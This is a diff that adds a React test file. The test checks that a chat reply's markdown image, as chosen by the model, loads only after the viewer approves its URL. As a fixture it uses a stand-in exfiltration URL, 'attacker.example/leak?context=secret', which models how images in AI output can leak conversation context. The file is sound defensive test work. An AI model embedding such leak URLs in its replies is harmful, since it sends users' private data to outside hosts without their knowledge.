@@ -1,0 +1,19 @@
+import { it, expect, vi } from 'vitest';
+import { fireEvent, render, screen } from '@testing-library/react';
+import { ReplyMarkdownImage } from './ReplyMarkdownImage';
+
+vi.mock('./ImageContainer', () => ({
+  default: ({ src }: { src: string }) => <img data-testid="loaded-image" src={src} />,
+}));
+
+it('does not load a model-chosen image until the viewer explicitly approves its URL', () => {
+  const onSendMessage = vi.fn();
+  const { rerender } = render(
+    <ReplyMarkdownImage src="https://attacker.example/leak?context=secret" onSendMessage={onSendMessage} />
+  );
+  expect(screen.queryByTestId('loaded-image')).toBeNull();
+  fireEvent.click(screen.getByTestId('reply-image-load-btn'));
+  expect(screen.getByTestId('loaded-image')).toHaveAttribute('src', 'https://attacker.example/leak?context=secret');
+  rerender(<ReplyMarkdownImage src="https://another.example/leak" onSendMessage={onSendMessage} />);
+  expect(screen.queryByTestId('loaded-image')).toBeNull();
+});
